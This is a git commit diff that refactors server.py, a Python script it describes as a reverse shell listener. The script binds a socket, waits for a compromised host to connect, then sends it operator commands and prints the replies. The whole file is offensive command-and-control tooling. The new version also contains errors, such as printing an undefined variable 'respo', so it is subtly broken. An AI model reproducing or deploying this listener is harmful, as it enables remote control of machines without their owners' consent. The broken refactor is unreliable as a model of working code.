1faedb51537bbdc06d5531ecd37a1cdcf1f96d67
emcruise <e.e@e>
2021-07-31 19:02:15 +0200

    Reformat server

--- server.py
+++ server.py
@@ -1,36 +1,45 @@
 #!/usr/bin/env python3
 import sys
 import socket
+from argparse import ArgumentParser
 
 
 def parse_args():
-    if len(sys.argv) != 3:
-        print('./server.py <host> <port>')
-        sys.exit(1)
-    return str(sys.argv[1]), int(sys.argv[2])
+    parser = ArgumentParser(description="A simple Python3 Reverse Shell Listener.")
+    parser.add_argument('host', type=str, help='Set host for Socket to listen on')
+    parser.add_argument('port', type=int, help='Set port for socket to listen on')
+    args = parser.parse_args()
+    return args.host, args.port
 
-def create_socket(host, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((host, port))
-    s.listen(1)
-    print('Listening for connection on {}:{}'.format(host, port))
-    return s.accept()
+class Listener():
+    def __init__(self, host, port):
+        self.__host = host
+        self.__port = port
+        self.__conn, self.__addr = self.create_socket()
+        self.start_shell()
 
-def loop(conn, addr):
-    while True:
-        try:
-            cmd = input('{}:{} > '.format(addr[0], addr[1]))
-        except KeyboardInterrupt:
-            print()
-            conn.close()
-            sys.exit(0)
-        cmd = cmd + '\x00'
-        conn.send(cmd.encode('utf-8'))
-        resp = conn.recv(2048).decode('utf-8')
-        print(resp)
+    def create_socket(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind((self.__host, self.__port))
+        s.listen(1)
+        print('Listening for connection on {}:{}'.format(host, port))
+        return s.accept()
+
+    def start_shell(self):
+        while True:
+            try:
+                cmd = input('{}:{} > '.format(self.__addr[0], self.__addr[1]))
+                cmd = cmd + '\x00'
+                self.__conn.send(cmd.encode('utf-8'))
+                resp = self.__conn.recv(2048).decode('utf-8')
+                print(respo)
+            except KeyboardInterrupt:
+                print()
+                self.__conn.close()
+                sys.exit(1)
+
 
 if __name__ == '__main__':
-    h, p = parse_args()
-    c, a = create_socket(h, p)
-    loop(c, a)
+    host, port = parse_args()
+    Listener(host, port)
